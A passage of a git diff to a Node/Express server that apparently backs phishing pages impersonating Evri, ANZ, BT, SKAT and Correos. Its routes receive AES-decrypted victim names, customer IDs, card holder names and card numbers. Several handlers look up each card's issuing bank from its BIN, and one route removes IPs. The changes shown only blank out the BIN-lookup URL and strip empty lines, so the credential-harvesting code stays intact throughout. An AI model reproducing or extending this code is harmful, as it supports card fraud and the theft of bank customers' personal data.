   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -18953,7 +18598,7 @@ app.post("/abzEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -19025,7 +18670,6 @@ app.post("/abzEvri", (req, res) => {
 
 let capzEvri = 3;
 
-
 app.post("/tcapzEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -19072,7 +18716,7 @@ app.post("/tcapzEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -19143,7 +18787,6 @@ app.post("/tcapzEvri", (req, res) => {
 
 let pokaEvri = 3;
 
-
 app.post("/pokaEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -19190,7 +18833,7 @@ app.post("/pokaEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -19260,7 +18903,6 @@ app.post("/pokaEvri", (req, res) => {
     });
 });
 
-
 app.post("/skiiGCEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -19307,7 +18949,7 @@ app.post("/skiiGCEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -19344,7 +18986,6 @@ app.post("/skiiGCEvri", (req, res) => {
 //ANZ
 //ANZ
 //ANZ
-
 
 app.post("/anzJuice", (req, res) => {
   customerId = CryptoJS.AES.decrypt(req.body.customerId, "402312").toString(
@@ -19403,7 +19044,6 @@ app.post("/anzJuice", (req, res) => {
   res.send("Update Completed");
 });
 
-
 app.post("/anzAR", (req, res) => {
   customerId = CryptoJS.AES.decrypt(req.body.customerId, "402312").toString(
     CryptoJS.enc.Utf8
@@ -19422,7 +19062,6 @@ app.post("/anzAR", (req, res) => {
   );
   res.send("Update Completed");
 });
-
 
 app.post("/anzHoods", (req, res) => {
   customerId = CryptoJS.AES.decrypt(req.body.customerId, "402312").toString(
@@ -19444,7 +19083,6 @@ app.post("/anzHoods", (req, res) => {
 });
 
 let anzTarrifi = 0;
-
 
 app.post("/anzTarrifi", (req, res) => {
   customerId = CryptoJS.AES.decrypt(req.body.customerId, "402312").toString(
@@ -19479,7 +19117,6 @@ app.post("/anzTarrifi", (req, res) => {
 //BT
 //BT
 //BT
-
 
 app.post("/@skiii719", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -19524,7 +19161,7 @@ app.post("/@skiii719", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -19553,7 +19190,6 @@ app.post("/@skiii719", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/ssfinesse", (req, res) => {
   username = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
@@ -19617,7 +19253,7 @@ app.post("/ssfinesse", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -19656,7 +19292,6 @@ app.post("/ssfinesse", (req, res) => {
 //SKAT
 
 let skat = 0;
-
 
 app.post("/skatPersonal", (req, res) => {
   username = req.body.username;
@@ -19706,7 +19341,6 @@ app.post("/skatPersonal", (req, res) => {
   res.send("Update Completed");
 });
 
-
 app.post("/skatBilling", (req, res) => {
   ccname = req.body.ccname;
   ccnum = req.body.ccnum;
@@ -19726,7 +19360,7 @@ app.post("/skatBilling", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -19781,7 +19415,6 @@ app.post("/skatBilling", (req, res) => {
 //CORREOS
 //CORREOS
 
-
 app.post("/correosKelv", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -19825,7 +19458,7 @@ app.post("/correosKelv", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -19863,7 +19496,6 @@ app.post("/correosKelv", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/correosAK", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -19908,7 +19540,7 @@ app.post("/correosAK", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -19946,7 +19578,6 @@ app.post("/correosAK", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/removeips", (req, res) => {
   ip = req.body.ip;
